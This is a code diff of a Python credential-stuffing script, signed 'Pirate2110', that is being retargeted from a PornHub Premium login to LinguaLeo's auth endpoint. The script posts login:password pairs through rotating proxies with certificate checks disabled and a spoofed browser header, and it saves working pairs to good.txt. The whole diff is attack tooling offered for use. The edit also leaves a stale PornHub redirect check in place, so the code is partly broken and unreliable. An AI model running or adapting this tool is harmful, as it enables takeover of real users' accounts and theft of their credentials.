@@ -15,8 +15,8 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Brute(object):
     def __init__(self):
-        self.projectName = "PornHub"
-        self.projectFullName = "PornHub Bruteforce and Checker"
+        self.projectName = "LinguaLeo"
+        self.projectFullName = "LinguaLeo only bruteforce"
         self.description = "Author : Pirate2110"
         self.good = 0
         self.bad = 0 
@@ -41,18 +41,16 @@ class Brute(object):
                 proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
             else:
                 proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
-            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
+            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36', 'Accept': 'application/json', 'Referer' : 'https://lingualeo.com/ru'}
             s = requests.session()
-            r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
-            site = soup(r.text, "html.parser")
-            token = site.find("input", id="token")
-            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
-            r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
             
-
-            if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
+            body = {"type":"mixed","credentials":{"email":login,"password":password}}
+            r = s.post("https://lingualeo.com/auth", json=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
+            
+            #print(r.text)
+            if "Incorrect authorization data" in r.text:
                 self.bad += 1
-            elif r.json()['success'] == "1":
+            elif "accessToken" in r.text:
                 if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
                     self.writelog("good.txt", login + ":" + password)
                 else:
